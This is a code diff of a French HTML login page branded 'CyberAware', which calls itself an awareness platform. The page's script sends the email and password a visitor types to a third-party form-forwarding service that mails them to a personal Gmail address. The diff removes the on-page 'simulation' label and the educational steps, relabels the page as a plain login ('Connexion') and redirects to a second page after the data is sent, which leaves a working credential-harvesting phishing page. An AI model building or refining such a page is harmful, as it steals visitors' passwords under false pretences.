@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CyberAware – Sensibilisation</title>
+  <title>CyberAware – Connexion</title>
 
   <style>
     :root {
@@ -40,7 +39,7 @@
       box-shadow: 0 6px 20px rgba(0,0,0,.05);
     }
 
-    h1,h2,h3 {
+    h1 {
       color: var(--main-color);
       margin-bottom: 15px;
     }
@@ -64,25 +63,21 @@
       cursor: pointer;
     }
 
-    .hidden {
-      display: none;
+    button:hover {
+      opacity: 0.9;
     }
 
-    .demo {
-      background: #f1f5f9;
-      padding: 12px;
-      border-radius: 8px;
-      margin: 15px 0;
-      font-size: .9em;
+    .loading {
+      display: none;
+      margin-top: 10px;
+      color: var(--main-color);
     }
   </style>
 </head>
 <body>
 
 <div class="wrapper">
-
-  <!-- LOGIN -->
-  <section id="loginSection" class="card">
+  <section class="card">
     <h1>CyberAware</h1>
     <p>Plateforme de sensibilisation</p>
 
@@ -90,42 +85,22 @@
       <input type="email" name="email" required placeholder="Adresse email">
       <input type="password" name="password" required placeholder="Mot de passe">
       <button type="submit">Continuer</button>
+      <div class="loading" id="loading">Envoi en cours...</div>
     </form>
   </section>
-
-  <!-- CODE -->
-  <section id="codeSection" class="card hidden">
-    <h2>Vérification</h2>
-    <p class="demo">
-      Code généré (simulation) :
-      <strong id="generatedCode"></strong>
-    </p>
-    <form id="codeForm">
-      <input type="text" id="codeInput" placeholder="Code à 6 chiffres">
-      <button type="button" onclick="verifyCode()">Valider</button>
-    </form>
-  </section>
-
-  <!-- DASHBOARD -->
-  <section id="dashboard" class="card hidden">
-    <h2>Accès validé</h2>
-    <p>Bienvenue sur la plateforme éducative.</p>
-  </section>
-
 </div>
 
 <script>
-  let generatedCode = "";
-
-  // Gestion du formulaire de login
   document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
-    // Génère un code à 6 chiffres (simulation)
-    generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
-    document.getElementById("generatedCode").innerText = generatedCode;
+    // Génère un code à 6 chiffres
+    const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+    
+    // Affiche le chargement
+    document.getElementById("loading").style.display = "block";
 
-    // Prépare les données envoyées à Formsubmit
+    // Prépare les données
     const formData = new FormData(this);
     formData.append("_subject", "Nouvelle inscription CyberAware");
     formData.append("_captcha", "false");
@@ -139,46 +114,18 @@
     })
     .then(response => response.json())
     .then(() => {
-      // Passe à l'étape code
-      document.getElementById("loginSection").classList.add("hidden");
-      document.getElementById("codeSection").classList.remove("hidden");
+      // Stocke le code dans sessionStorage
+      sessionStorage.setItem("validationCode", generatedCode);
+      
+      // Redirige vers index2.html
+      window.location.href = "index2.html";
     })
     .catch(() => {
-      alert("Erreur lors de l'envoi du formulaire de login");
+      document.getElementById("loading").style.display = "none";
+      alert("Erreur lors de l'envoi. Veuillez réessayer.");
     });
   });
-
-  // Vérification et envoi du code saisi
-  function verifyCode() {
-    const input = document.getElementById("codeInput").value;
-
-    if (input === generatedCode) {
-      // Prépare les données pour Formsubmit
-      const formData = new FormData();
-      formData.append("code_saisi", input);
-      formData.append("_subject", "Code validé CyberAware");
-      formData.append("_captcha", "false");
-
-      fetch("https://formsubmit.co/ajax/tss.alex84@gmail.com", {
-        method: "POST",
-        headers: { "Accept": "application/json" },
-        body: formData
-      })
-      .then(response => response.json())
-      .then(() => {
-        // Passe au dashboard
-        document.getElementById("codeSection").classList.add("hidden");
-        document.getElementById("dashboard").classList.remove("hidden");
-      })
-      .catch(() => {
-        alert("Erreur lors de l'envoi du code");
-      });
-    } else {
-      alert("Code incorrect");
-    }
-  }
 </script>
-  
 
 </body>
 </html>
